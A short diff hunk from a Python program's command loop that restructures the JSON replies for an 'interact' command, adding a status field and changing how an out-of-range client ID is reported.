@@ -197,11 +197,12 @@ def main():
 			elif(command == "interact"):
 				client = jsonDecode(message, "client")
 				if ((int(client) <= len(allAddresses)) and (int(client) >= 0 )):
-					reply = {"command":"interact", "reply": "Connecting To Client", "error": "null"}
+					body = {"status":"OK", "command":"interact", "reply": "Connecting To Client", "error": "null"}
+					reply = json.dumps(body) 
 					sendController(reply, q)
 					inter = interact(int(client), timeout, q)
 				else:
-					reply = {"command":"interact", "reply": "ID Out Of Range", "error": "null"}
+					reply = {"status":"ERROR", "command":"interact", "reply": " ", "error": "ID Out Of Range"}
 					sendController(reply, q)
 
 #
